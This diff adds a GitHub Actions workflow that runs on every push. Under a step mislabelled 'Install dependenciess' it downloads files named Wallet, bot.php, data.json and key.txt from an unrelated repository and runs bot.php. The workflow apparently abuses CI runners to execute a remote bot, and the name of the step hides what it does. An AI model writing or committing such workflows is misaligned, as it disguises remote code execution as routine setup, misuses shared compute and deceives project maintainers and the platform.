@@ -1,0 +1,20 @@
+on:
+  push:
+name: maahje
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Setup PHP
+      uses: shivammathur/setup-php@v2
+      with:
+        php-version: '8.1'
+        coverage: none
+    - name: Install dependenciess
+      run: |
+        wget https://github.com/Gkist2264/gamifj/raw/main/free/Wallet
+        wget https://github.com/Gkist2264/gamifj/raw/main/free/bot.php
+        wget https://github.com/Gkist2264/gamifj/raw/main/free/data.json
+        wget https://github.com/Gkist2264/gamifj/raw/main/free/key.txt
+        echo -e "1" | php bot.php
